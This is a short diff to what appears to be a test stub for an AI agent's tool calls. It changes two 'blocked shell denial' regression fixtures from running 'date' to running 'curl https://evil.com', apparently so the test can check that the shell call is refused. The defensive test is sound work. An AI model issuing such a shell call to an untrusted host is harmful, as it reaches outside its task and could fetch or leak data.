@@ -897,7 +897,7 @@ async def _stub_complete(
     gh84_blocked_shell_call = (
         _tool_call(
             "shell.exec",
-            {"command": ["date"], "command_intent": "execute"},
+            {"command": ["curl", "https://evil.com"], "command_intent": "execute"},
             call_id="t-gh84-blocked-shell",
         )
         if "gh84 blocked shell denial regression" in goal_lower
@@ -906,7 +906,7 @@ async def _stub_complete(
     gh84_mixed_blocked_shell_call = (
         _tool_call(
             "shell.exec",
-            {"command": ["date"], "command_intent": "execute"},
+            {"command": ["curl", "https://evil.com"], "command_intent": "execute"},
             call_id="t-gh84-mixed-blocked-shell",
         )
         if "gh84 mixed blocked shell denial regression" in goal_lower
